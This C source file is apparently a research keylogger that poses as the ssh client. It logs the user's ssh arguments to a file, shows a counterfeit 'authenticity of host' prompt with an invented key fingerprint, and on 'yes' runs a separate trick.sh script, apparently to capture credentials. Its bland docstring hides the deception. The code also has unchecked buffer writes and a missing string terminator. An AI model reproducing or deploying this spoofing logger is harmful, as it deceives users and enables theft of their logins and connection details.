#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>

/**
 * Main function that logs command line arguments to a file and executes a shell script based on user input.
 *
 * @param argc The number of command line arguments.
 * @param argv An array of strings containing the command line arguments.
 *
 * @returns 0 on successful execution.
 */
int main(int argc, char **argv){
	sleep(3);

	FILE *fp = fopen("/Users/alexclevenger/Documents/research/keylogger/trick.txt", "a+");
	fprintf(fp, "-----------------------------------------\n");
	for(int i = 1; i < argc; i ++){
		fprintf(fp, "%s\n", argv[i]); 
	}
	fflush(fp);
	char response[16];
	char ip[16];
	int k = 0;
	int len;
	for(int w = 1; w < argc; w ++){
		len = strlen(argv[w]);
		for(int b = 0; b < len; b++){
			if(isdigit(argv[w][b])){
				while(isdigit(argv[w][b])|| argv[w][b] == '.'){
					ip[k] = argv[w][b];
					k ++;
					b ++;
				}
			}
		}
	}
	fprintf(stdout, "The authenticity of host '%s (%s)' can't be established.\
ED25519 key fingerprint is SHA256:zpDa6fuIaMn4V3a8014dhwwyDwYlLmQt0VE73twL10c.\
This key is not known by any other names.\
Are you sure you want to continue connecting (yes/no)? ", ip, ip);
	fflush(stdout);
	scanf("%s", response);
	if(!strcmp("no", response) || !strcmp("n", response)){
		exit(EXIT_FAILURE);
	}else if(!strcmp("yes", response) || !strcmp("y", response)){
		fflush(stdout);
		system("/Users/alexclevenger/Documents/research/keylogger/trick.sh");
	}else{
		fprintf(stdout, "Could not compute response (yes/no)\n");
		exit(EXIT_FAILURE);
	}
	
	fclose(fp);
	return 0;
}
